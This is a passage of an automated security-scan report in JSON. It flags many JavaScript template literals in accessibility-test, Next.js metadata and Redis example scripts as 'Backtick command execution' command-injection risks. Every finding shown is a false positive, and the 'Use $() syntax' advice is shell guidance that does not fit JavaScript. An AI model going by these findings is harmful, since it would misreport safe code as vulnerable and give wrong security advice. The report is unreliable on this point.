        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 345,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('focus-indicators', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 365,
        "issue": "Backtick command execution",
        "evidence": "const key = `${current.tagName}:${current.id}:${current.className}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 416,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('keyboard-traps', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": "`Skip link found: \"${skipLink.text}\" -> ${skipLink.href}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 458,
        "issue": "Backtick command execution",
        "evidence": "`Skip link found but target doesn't exist: ${skipLink.href}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 467,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('skip-links', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 527,
        "issue": "Backtick command execution",
        "evidence": "`${interactive.length} potential keyboard interaction issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 532,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('interactive-elements', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 588,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('modals', true, `${modals.total} modal(s) have proper attributes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 592,
        "issue": "Backtick command execution",
        "evidence": "`${modals.issues.length} modal accessibility issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 597,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('modals', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 631,
        "issue": "Backtick command execution",
        "evidence": "const trigger = document.querySelector(`[aria-controls=\"${menu.id}\"]`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 668,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('menus', true, `${menus.total} menu(s) have proper structure`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 672,
        "issue": "Backtick command execution",
        "evidence": "`${menus.issues.length} menu accessibility issues found`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 677,
        "issue": "Backtick command execution",
        "evidence": "result.addTest('menus', false, `Test failed: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 691,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`URL: ${result.url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 692,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Timestamp: ${result.timestamp}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 694,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Summary:`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 695,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Total Tests: ${result.tests.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 696,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Passed: ${result.passed}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 697,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Failed: ${result.failed}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 698,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`  Warnings: ${result.warnings}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 710,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 711,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Message: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 713,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 723,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 724,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Message: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 726,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`   Details: ${JSON.stringify(test.details, null, 2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 736,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`${i + 1}. ${test.name}: ${test.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 811,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Testing keyboard navigation: ${url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 823,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Report written to: ${options.output}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 832,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/web-accessibility/resources/scripts/test_keyboard_nav.js",
        "line_number": 851,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Fatal error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 88,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`File not found: ${filePath}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 291,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`NEXT.JS METADATA TEST: ${results.file}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 298,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Metadata Type: ${results.hasStaticMetadata ? 'Static' : ''}${results.hasDynamicMetadata ? 'Dynamic' : ''}${!results.hasStaticMetadata && !results.hasDynamicMetadata ? 'None' : ''}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 299,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Issues:        ${results.issues.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 300,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Warnings:      ${results.warnings.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 301,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`Successes:     ${results.successes.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 309,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[${issue.severity.toUpperCase()}] ${issue.category}: ${issue.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 319,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[WARN] ${warning.category}: ${warning.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "lines.push(`[OK] ${success.category}: ${success.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/scripts/test_metadata.js",
        "line_number": 400,
        "issue": "Backtick command execution",
        "evidence": "console.error(`Error: ${error.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 42,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Publisher] Published to ${channel}: ${count} subscribers`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 54,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Received on ${subscribedChannel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 68,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Subscribed to ${channel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 79,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Received on ${channel} (pattern: ${pattern})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 92,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Subscribed to pattern ${pattern}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Unsubscribed from ${channel}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 114,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Subscriber] Unsubscribed from pattern ${pattern}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 162,
        "issue": "Backtick command execution",
        "evidence": "this.channel = `chat:room:${roomId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 197,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[ChatRoom] ${userId} joined ${this.roomId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 216,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[ChatRoom] ${userId} left ${this.roomId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 238,
        "issue": "Backtick command execution",
        "evidence": "const channel = `notifications:user:${userId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "const channel = `notifications:user:${userId}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 294,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Handler] Received: ${message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 324,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Handler] Channel: ${channel}, Message: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 355,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId}: ${message.message}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 357,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId} joined the room`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Chat] ${message.userId} left the room`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 394,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Notification] ${notification.type}:`, notification.data);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 399,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Broadcast] ${notification.type}:`, notification.data);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 447,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 1] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 451,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 2] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Service 3] Received: ${JSON.stringify(message)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 463,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Subscribers on ${channel}: ${count}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 496,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Cache] Invalidated: ${key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 506,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Cache] Size: ${cache.size}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/pubsub_example.js",
        "line_number": 514,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [Cache] Size after invalidation: ${cache.size}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 18,
        "issue": "Backtick command execution",
        "evidence": "this.key = `leaderboard:${name}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 29,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Added ${playerId} with score ${score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 41,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Incremented ${playerId} by ${increment} (new: ${newScore})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 140,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Removed ${playerId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 157,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Cleared`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 171,
        "issue": "Backtick command execution",
        "evidence": "super(redisClient, `${name}:${period}:${timestamp}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 190,
        "issue": "Backtick command execution",
        "evidence": "return `${now.getFullYear()}-W${week}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 193,
        "issue": "Backtick command execution",
        "evidence": "return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 220,
        "issue": "Backtick command execution",
        "evidence": "console.log(`[Leaderboard] Set expiration: ${days} days`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 248,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 256,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${player}: Rank ${rank + 1}, Score ${score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 264,
        "issue": "Backtick command execution",
        "evidence": "console.log(`player3: New Rank ${newRank + 1}, New Score ${newScore}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 271,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${p.rank + 1}. ${p.player}: ${p.score}${marker}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 277,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total players: ${count}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 295,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Key: ${daily.key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 304,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Key: ${weekly.key}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 322,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "await leaderboard.addScore(`player${i}`, i * 100);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 351,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 357,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${highScorers.length} high scorers`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 401,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 407,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 413,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${p.rank + 1}. ${p.player}: ${p.score}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 418,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Casual: ${await casual.getScore('player1')} (Rank ${await casual.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 419,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Ranked: ${await ranked.getScore('player1')} (Rank ${await ranked.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/redis-data-structures/resources/examples/node/leaderboard.js",
        "line_number": 420,
        "issue": "Backtick command execution",
